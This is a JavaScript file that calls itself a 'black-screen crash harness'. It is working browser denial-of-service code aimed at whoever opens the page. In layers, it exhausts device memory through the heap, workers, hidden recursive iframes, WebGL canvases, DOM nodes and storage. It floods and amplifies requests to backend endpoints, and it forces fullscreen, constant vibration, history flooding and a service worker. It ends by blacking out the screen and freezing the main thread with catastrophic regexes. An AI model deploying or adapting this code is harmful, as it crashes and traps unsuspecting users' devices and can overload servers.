/*!
 * MAGIC — pressure engine v1.0
 * Fully automatic black-screen crash harness.
 * Params: x=power(0.1-5)  p=phase-limit  s=1 telemetry
 *         fs=0 no-fullscreen  v=0 no-vibrate  net=0 no-network  m=1 mini
 */
(() => {
  'use strict';

  const P = new URLSearchParams(location.search);
  const clamp = (v, a, b) => (v < a ? a : v > b ? b : v);

  const MINI = P.get('m') === '1';
  const MULT = clamp(parseFloat(P.get('x')) || 1, 0.1, 5);
  const TELE = P.get('s') === '1';
  const FS   = P.get('fs') !== '0';
  const VIB  = P.get('v')  !== '0';
  const NET  = P.get('net') !== '0';

  const nav   = navigator;
  const memGB = clamp(+nav.deviceMemory || 4, 2, 32);
  const cores = clamp(+nav.hardwareConcurrency || 4, 1, 16);

  /* power factor: scales every layer to the actual device */
  const POW = clamp((memGB / 6) * (1 + cores / 12) * MULT, 0.15, 8);

  const HEAP_TARGET = Math.min(memGB * 0.65, 11) * 1e9 * clamp(POW, 0.5, 1.6);
  const MAXDEPTH    = Math.round(clamp(3 + POW, 3, 7));

  const $ = (id) => document.getElementById(id);
  const elM = $('m'), elS = $('s'), elStage = $('stage'), elC = $('c');

  /* everything is pinned forever so GC cannot reclaim it */
  const HOLD  = [];
  const BYTES = [];
  const hold  = (v) => { HOLD.push(v); return v; };
  const later = (fn, ms) => { const t = setTimeout(fn, ms); HOLD.push(t); return t; };
  const at    = (ms, fn) => later(fn, ms);
  const safe  = (fn) => { try { return fn(); } catch (e) { return undefined; } };

  const mark = (name, v) => {
    if (TELE && elS) elS.textContent = name + (v == null ? '' : ' ' + v);
  };

  /* touch one byte per 4K page => forces real commit, not lazy reservation */
  const bite = (bytes) => {
    const a = new Uint8Array(bytes);
    for (let i = 0; i < bytes; i += 4096) a[i] = i & 255;
    return a;
  };

  /* ---------- LAYER 1: heap OOM, sliced so timers still fire ---------- */
  let heapGot = 0;
  function heapSlice() {
    const step = clamp(Math.round(7 * POW), 2, 64) << 20;
    const t0 = performance.now();
    do {
      try {
        BYTES.push(bite(step));
        heapGot += step;
      } catch (e) {
        BYTES.length = 0;          // free everything, then slam again
        heapGot = 0;
        safe(() => BYTES.push(bite(step >> 2)));
      }
      if (heapGot >= HEAP_TARGET) { mark('HEAP-FULL', (heapGot >> 20) + 'M'); return; }
    } while (performance.now() - t0 < 26);
    mark('HEAP', (heapGot >> 20) + 'M');
    later(heapSlice, 6);
  }

  /* ---------- LAYER 2: worker threads, each its own heap ---------- */
  const WORKER_SRC = `
    var hold = [];
    onmessage = function (e) {
      var step = e.data || 4194304;
      for (;;) {
        try {
          var a = new Uint8Array(step);
          for (var i = 0; i < step; i += 4096) a[i] = i & 255;
          hold.push(a);
        } catch (err) { hold = []; }
      }
    };`;

  function workerBomb(n) {
    let url;
    try { url = URL.createObjectURL(new Blob([WORKER_SRC], { type: 'text/javascript' })); }
    catch (e) { return; }
    const step = clamp(Math.round(2 * POW), 1, 24) << 20;
    for (let i = 0; i < n; i++) {
      try {
        const w = new Worker(url);
        w.onmessage = () => {};
        w.postMessage(step);
        hold(w);
      } catch (e) { break; }
    }
  }

  /* ---------- LAYER 3: recursive same-origin iframes ---------- */
  function frameBomb() {
    const level = parseInt(P.get('d'), 10) || 0;
    if (level >= MAXDEPTH) return;
    for (let i = 0; i < 2; i++) {
      try {
        const f = document.createElement('iframe');
        f.src = '/void.html?m=1&d=' + (level + 1) + '&x=' + POW.toFixed(2);
        f.setAttribute('width', '1');
        f.setAttribute('height', '1');
        f.setAttribute('scrolling', 'no');
        f.style.cssText =
          'position:fixed;left:0;top:0;width:1px;height:1px;border:0;opacity:0;pointer-events:none';
        document.body.appendChild(f);
        hold(f);
      } catch (e) { break; }
    }
  }

  /* ---------- LAYER 4: GPU / WebGL context + canvas memory ---------- */
  function gpuBomb(n) {
    const side = clamp(Math.round(1536 * Math.sqrt(POW)), 512, 4096);
    for (let i = 0; i < n; i++) {
      try {
        const cv = document.createElement('canvas');
        cv.width = side; cv.height = side;
        const gl = cv.getContext('webgl', {
          antialias: false, depth: true, stencil: false,
          powerPreference: 'high-performance', preserveDrawingBuffer: false
        }) || cv.getContext('experimental-webgl');
        if (gl) { gl.clearColor(0, 0, 0, 1); gl.clear(gl.COLOR_BUFFER_BIT); }
        else { const c2 = cv.getContext('2d'); if (c2) c2.fillRect(0, 0, side, side); }
        hold(cv); hold(gl);
      } catch (e) { break; }
    }
  }

  /* ---------- LAYER 5: DOM + forced compositor layers ---------- */
  function domBomb(n) {
    if (!elStage) return;
    const frag = document.createDocumentFragment();
    for (let i = 0; i < n; i++) {
      const d = document.createElement('div');
      d.textContent = 'MAGIC';
      d.style.cssText =
        'position:absolute;left:' + (i % 37) + 'px;top:' + (i % 53) + 'px;' +
        'width:3px;height:3px;font:1px/1 monospace;color:#000;' +
        'transform:translate3d(0,0,0);will-change:transform;contain:strict';
      frag.appendChild(d);
    }
    elStage.appendChild(frag);
  }

  /* ---------- LAYER 6: storage churn ---------- */
  function storageBomb() {
    const blob = 'M'.repeat(65536);
    try { for (let i = 0; i < 140; i++) localStorage.setItem('m' + i, blob + i); } catch (e) {}
    try { for (let i = 0; i < 140; i++) sessionStorage.setItem('s' + i, blob + i); } catch (e) {}
  }

  /* ---------- LAYER 7: network flood + backend fan-out chain ---------- */
  function netFlood() {
    const CONC = clamp(Math.round(8 * POW) + 8, 8, 72);
    const sizes = [32, 128, 512, 1024, 2048, 4096];
    const lane = (i) => {
      const kb = sizes[i % sizes.length];
      const go = () => {
        fetch('/api/hammer?s=' + kb + '&c=1&r=' + Math.random(), { cache: 'no-store' })
          .then((r) => r.arrayBuffer())
          .then((b) => { BYTES.push(b); go(); })
          .catch(() => later(go, 25));
      };
      go();
    };
    for (let i = 0; i < CONC; i++) later(() => lane(i), i * 10);

    /* server-side amplification: each hit fans out to more functions */
    for (let i = 0; i < Math.min(4, Math.round(POW) + 2); i++) {
      const chain = () => {
        fetch('/api/chain?d=0&f=3&s=48&r=' + Math.random(), { cache: 'no-store' })
          .then((r) => r.arrayBuffer())
          .then((b) => { BYTES.push(b); chain(); })
          .catch(() => later(chain, 60));
      };
      later(chain, 110 + i * 80);
    }
  }

  /* ---------- shell: fullscreen, wake lock, haptics, history, SW ---------- */
  function fullscreen() {
    if (!FS || MINI) return;
    const d = document.documentElement;
    const fn = d.requestFullscreen || d.webkitRequestFullscreen || d.mozRequestFullScreen;
    if (fn) safe(() => { const r = fn.call(d, { navigationUI: 'hide' }); if (r && r.catch) r.catch(() => {}); });
    safe(() => { const o = screen.orientation; if (o && o.lock) o.lock('portrait').catch(() => {}); });
  }

  function wakeLock() {
    if (MINI) return;
    safe(() => nav.wakeLock.request('screen').then((l) => hold(l)).catch(() => {}));
  }

  function buzz() {
    if (!VIB) return;
    safe(() => nav.vibrate([120, 60, 180, 80, 240, 120, 400]));
    later(buzz, 850);
  }

  let hstep = 0;
  function historyBomb() {
    if (MINI) return;
    for (let i = 0; i < 250; i++) {
      try { history.pushState(null, '', '#' + (hstep++)); } catch (e) { break; }
    }
    later(historyBomb, 25);
  }

  function registerSW() {
    if (MINI) return;
    safe(() => nav.serviceWorker && nav.serviceWorker.register('/sw.js').then((r) => hold(r)).catch(() => {}));
  }

  /* ---------- blackout ---------- */
  function blackout() {
    mark('BLACK');
    safe(() => elM && elM.classList.add('dim'));
    safe(() => elStage && (elStage.style.display = 'none'));
    safe(() => elC && elC.remove());
    safe(() => { document.documentElement.style.background = '#000'; document.body.style.background = '#000'; });
    safe(() => elS && (elS.textContent = ''));
    safe(() => nav.vibrate([450, 80, 450, 80, 1200]));
  }

  /* ---------- LAYER 8: permanent main-thread freeze ---------- */
  const RE1 = /^(a+)+$/;
  const RE2 = /(a|aa)+$/;
  const S1  = 'a'.repeat(28) + '!';   // ~2^28 backtracks
  const S2  = 'a'.repeat(20) + '!';

  function freeze() {
    mark('FREEZE');
    for (;;) {
      safe(() => RE1.test(S1));
      safe(() => RE2.test(S2));
      try { hold(new Uint8Array(1 << 20)); } catch (e) { BYTES.length = 0; }
    }
  }

  /* ---------- boot ---------- */
  if (MINI) {
    at(0,   frameBomb);
    at(8,   () => heapSlice());
    at(50,  () => gpuBomb(2));
    at(320, freeze);
  } else {
    at(0,    () => { mark('BOOT'); fullscreen(); wakeLock(); buzz(); historyBomb(); registerSW(); });
    at(16,   () => mark('DEVICE', memGB + 'G/' + cores + 'C/x' + POW.toFixed(2)));
    if (NET) at(36, () => { mark('NET'); netFlood(); });
    at(80,   () => { mark('WORKERS'); workerBomb(clamp(Math.round(cores * 1.6 * POW), 2, 40)); });
    at(140,  () => { mark('FRAMES');  frameBomb(); });
    at(210,  () => { mark('GPU');     gpuBomb(clamp(Math.round(6 * POW), 3, 40)); });
    at(280,  () => { mark('DOM');     domBomb(clamp(Math.round(2600 * POW), 1500, 12000)); });
    at(360,  () => { mark('HEAP');    heapSlice(); });
    at(520,  () => { mark('STORAGE'); storageBomb(); });
    at(640,  blackout);
    at(1100, freeze);
  }
})();
